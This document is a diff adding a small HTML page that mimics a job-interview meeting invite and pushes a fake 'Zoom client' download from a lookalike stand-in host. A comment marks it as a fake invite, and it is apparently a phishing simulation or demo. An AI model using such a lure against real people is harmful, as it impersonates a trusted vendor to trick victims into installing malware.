@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Join meeting</title>
+<style>
+  body{font-family:sans-serif;background:#f3f4f6;color:#111;margin:0;padding:60px;text-align:center}
+  a.btn{display:inline-block;background:#2563eb;color:#fff;padding:12px 20px;border-radius:8px;text-decoration:none}
+</style>
+</head>
+<body>
+  <!-- Fake meeting invite: "download our client to join the interview",
+       served from a lookalike host. ?real=1 links to the vendor instead. -->
+  <h1>You have been invited to an interview</h1>
+  <p>Meeting ID 845 221 0937 · Hiring team, Acme Labs</p>
+  <p>To join the meeting, download the latest Zoom client.</p>
+  <p><a class="btn" id="dl" href="https://zoom-meeting-join.example/ZoomInstaller.exe">Download</a></p>
+<script>
+  if (new URLSearchParams(location.search).get("real")) {
+    document.getElementById("dl").href = "https://zoom.us/download";
+  }
+</script>
+</body>
+</html>
